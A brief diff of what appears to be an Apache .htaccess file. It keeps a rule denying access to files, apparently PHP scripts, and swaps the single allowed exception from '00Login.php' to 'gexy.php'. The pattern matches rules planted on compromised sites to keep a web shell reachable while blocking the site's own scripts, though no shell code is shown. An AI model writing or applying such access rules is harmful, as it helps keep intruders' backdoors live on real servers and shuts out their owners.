@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(00Login.php)$"># 
+<FilesMatch "^(gexy.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch>
